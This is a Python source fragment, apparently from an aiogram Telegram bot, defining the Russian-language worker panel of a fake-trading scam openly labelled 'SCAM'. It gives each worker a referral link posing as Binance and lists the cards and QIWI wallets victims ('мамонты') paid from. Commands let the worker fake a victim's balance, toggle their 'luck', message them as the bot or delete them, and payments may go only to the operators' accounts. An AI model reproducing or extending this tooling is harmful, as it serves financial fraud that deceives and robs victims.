from aiogram.utils.emoji import emojize



# trading info

trading_text = emojize(
    ":chart_with_upwards_trend: <b>Трейдинг</b> SCAM\n\n"
    "Твой код - {worker_id}\n"
    f"Скам бот - @{config.trading_username}\n"
    f"Тех. поддержка - {config.trading_sup_username}\n\n"
    f"Твоя рефка Binance - https://t.me/{config.trading_username}"
    "?start={worker_id}\n\n"
    "Карты с которых вы пополняли:\n"
    "{pay_cards}\n"
    "QIWI с которых вы пополняли:\n"
    "{pay_qiwis}\n\n"
    "/fdel <code>[ID фразы]</code> - удалить фразу\n"
    "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
    "/del <code>[ID мамонта]</code> - удалить мамонта\n"
    "/fart <code>[ID мамонта]</code> - вкл / выкл / выкл/вкл фарт мамонту\n"
    "/msg <code>[ID мамонта]</code>; <code>[Сообщение]</code> - сообщение от бота\n"
    "/bal <code>[ID мамонта];</code> <code>[Баланс]</code> - изменить баланс мамонта\n"
    f"Запрещено использовать любые ТП кроме {config.trading_sup_username}\n"
    "Запрещено принимать оплату на любые реквизиты кроме наших"
)
